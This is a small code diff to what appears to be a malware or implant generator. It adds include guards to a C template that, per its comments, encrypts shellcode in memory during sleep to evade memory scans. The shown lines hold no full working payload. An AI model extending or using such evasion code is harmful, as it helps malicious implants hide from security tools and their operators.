@@ -37,6 +37,9 @@ def generate_sleep_encrypt() -> Dict[str, Any]:
 // Layer 4 – Behavioral Evasion
 // Encrypts the in-process shellcode region during sleep to evade memory scans.
 
+#ifndef PHANTOM_SLEEP_ENCRYPT_INCLUDED
+#define PHANTOM_SLEEP_ENCRYPT_INCLUDED
+
 #include <windows.h>
 #include <ntsecapi.h>  // SystemFunction032
 
@@ -80,6 +83,8 @@ static void encrypted_sleep(LPVOID region, SIZE_T region_size,
 plain_sleep:
     Sleep(ms);
 }
+
+#endif /* PHANTOM_SLEEP_ENCRYPT_INCLUDED */
 """
 
     return {
